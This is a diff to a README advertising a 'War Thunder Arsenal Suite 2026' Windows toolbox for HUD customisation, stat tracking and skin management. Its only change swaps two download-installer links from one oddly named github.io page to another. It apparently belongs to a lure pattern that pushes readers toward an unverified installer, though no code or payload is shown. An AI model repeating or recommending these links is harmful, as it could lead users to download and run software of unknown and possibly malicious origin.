@@ -2,7 +2,7 @@
 
 The **War Thunder Arsenal Suite 2026** is a comprehensive Windows desktop utility designed to elevate your War Thunder experience. Whether you are a seasoned pilot or a new tanker, this all-in-one enhanced toolbox brings together HUD customization, real-time stat tracking, and an intuitive skin management system — all within a single lightweight installer. Built specifically for Windows 10 and Windows 11, the War Thunder Arsenal Suite 2026 puts powerful customization and gameplay insight tools at your fingertips without compromising system performance.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## What's Inside
 
@@ -63,7 +63,7 @@ No. The War Thunder Arsenal Suite 2026 operates entirely offline. All statistics
 
 Ready to get started? Download the latest version of the War Thunder Arsenal Suite 2026 for Windows:
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 *Last Updated: June 2026 — Version 15.07*
 *© 2026 War Thunder Arsenal Suite Contributors. All rights reserved.*
